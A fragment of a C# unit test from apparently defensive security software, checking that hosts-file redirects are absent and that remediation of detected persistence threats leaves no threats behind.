            Assert.False(hostsReport.HasSuspiciousRedirects);

            // 2. Dashboard triggers 1-click remediation for detected threats
            var remResults = await persistenceEngine.RemediateAllAsync(persistenceReport.Threats);
            Assert.Single(remResults);
            Assert.True(remResults[0].Success);

            // 3. Telemetry values update to clean state
            int remainingThreats = persistenceReport.ThreatCount - remResults.Count(r => r.Success);
            Assert.Equal(0, remainingThreats);
        }

        #endregion
    }
}
